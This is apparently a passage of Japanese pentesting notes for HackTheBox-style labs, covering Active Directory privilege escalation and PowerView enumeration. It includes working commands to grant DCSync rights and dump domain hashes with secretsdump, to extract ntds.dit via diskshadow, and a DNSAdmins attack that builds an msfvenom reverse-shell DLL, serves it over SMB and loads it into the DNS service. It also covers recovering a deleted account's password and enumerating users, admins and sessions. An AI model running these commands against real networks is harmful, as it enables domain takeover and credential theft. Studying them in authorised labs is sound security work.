Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zeus -Rights DCSync

そしてsecretsdumpでハッシュを取得する
impacket-secretsdump 'htb/zeus:password@10.10.10.161'
```
  
  
###  SeRestorePrivilegeでntds.ditを抽出する

```
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

raj.dsh
/home/kali/Tools/Windows-Weapons/SeBackup/raj.dsh

cd C:\Temp
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit
```
ㅤ  
ㅤ  
### DNSAdminグループに所属している場合の権限昇格

```
whoami /all
DNS Adminが所属しているかどうか確認

kali側
/home/kali/Tools/Windows-Weapons/share/rev.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f dll -o rev.dll
impacket-smbserver share ./

rlwrap nc -lvnp 443

windows側
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.5\share\rev.dll
cmd /c sc.exe stop dns
cmd /c sc.exe start dns
ここでsmbserverが発火してリバースシェルが実行される
```
  
### AD Recycle Binグループに入っている場合のゴミ箱漁り

```
Get-ADObject -ldapfilter "(&(ObjectClass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *

cascadeLegacyPwdの項目をbase64でデコードする
```
ㅤ  
ㅤ  
# PowerViewについて

参考:https://www.youtube.com/watch?v=n3Ow_LKanMo

**ドメインフォレストなどを見てドメイン間を移動できるか、情報を列挙できるかどうかをPowerViewなどで確認することでわかる**  

**OSのバージョンを列挙してEternalBlueなどもありえる**  


### 共有フォルダを取得する(Invoke-ShareFinder)
  
使用できる共有フォルダを取得できる  
PsExecの使用条件の確認などにも使える  
  
```
Invoke-ShareFinder
```
  
  
### オンライン状態の管理者特権でアクセスできるコンピュータを列挙する(Find-LocalAdminAccess)

```
Find-LocalAdminAccess
```




### すべての管理者特権でアクセスできるコンピュータを列挙する(Invoke-EnumerateLocalAdmin)

```
Invoke-EnumerateLocalAdmin
```



  
### ドメインコントローラについての情報を取得する(Get-NetDomainController)

```
Get-NetDomainController
```




### ドメインに関する情報を取得する

#### ドメイン名の取得

```
Get-NetDomain
```

#### ドメインのSIDの取得

```
Get-DomainSID
```

#### ドメインのポリシーを取得

```
Get-DomainPolicy
```





### ユーザーアカウントの列挙(Get-NetUser)

ユーザー情報だけでなく、sidや所属しているグループ,AD構成やAD環境についての情報も収集できる

```
Get-NetUser

ユーザー名、sid, adspathのみを取得したい場合:
Get-NetUser | select cn , objectsid , adspath
```

#### 特定のユーザーのみの情報を取得する場合

```
例:admin2ユーザーの情報を取得する
Get-NetUser -UserName admin2
```





### グループを列挙する(Get-NetGroup)

グループの情報を列挙する

```
Get-NetGroup
```

#### 管理者権限のあるグループを列挙する

```
Get-NetGroup -AdminCount
```

#### ユーザー名から所属しているグループを取得する

```
Get-NetGroup -UserName Admin2
```

#### グループ名からそのグループに所属しているユーザーを列挙する

```
Get-NetGroupMember -GroupName "Administrator"
```

#### ドメイン名からグループを絞り込む

指定したドメインに参加しているグループのみを表示する

```
Get-NetGroup -domain <ドメイン名>.local
```








### ドメイン内の現在の全コンピュータの一覧を取得する(Get-NetComputer)

ドメイン内の現在の全サーバの一覧を取得する

```
Get-NetComputer
```

#### オンライン状態のドメイン内の現在の全コンピュータの一覧を取得する

```
Get-NetComputer -Ping
```

#### ドメイン内の現在の全コンピュータの一覧を詳細付き表示取得する

```
Get-NetComputer -fulldata

Get-NetComputer -fulldata | select cn , operatingsystem
```







### グループポリシーを取得する(Get-NetGPO)

**グループポリシーを取得することで得られる情報**

displayname属性のdisable windows defenderなど  

```
Get-NetGPO
```







### 現在ログオン中のユーザーを取得する

```
Get-NetLoggedon -ComputerName Domain-Controller.CONTROLLER.local
```

#### 最後にログオンした人を特定する

```
Get-LastLoggedOn -ComputerName Domain-Controller.CONTROLLER.local
```






### アクティブなRDPセッションを取得する

```
Usernameの値がないやつは無視?(本来であればUserNameの値が表示される)
Get-NetRDPSession -ComputerName Domain-Controller.CONTROLLER.local
```
